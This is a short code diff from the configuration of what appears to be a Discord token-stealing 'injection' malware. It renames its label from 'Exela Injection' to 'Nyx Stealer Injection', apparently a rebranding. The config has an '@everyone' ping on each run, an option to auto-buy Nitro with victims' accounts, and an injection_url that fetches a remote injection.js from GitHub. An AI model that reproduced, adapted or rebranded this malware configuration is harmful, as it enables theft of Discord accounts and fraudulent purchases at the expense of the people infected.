@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Exela Injection', 
+  embed_name: 'Nyx Stealer Injection', 
   embed_icon: 'https://i.hizliresim.com/6t31tw2.jpg', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/quicaxd/Exela-V2.0/main/injection/injection.js', 
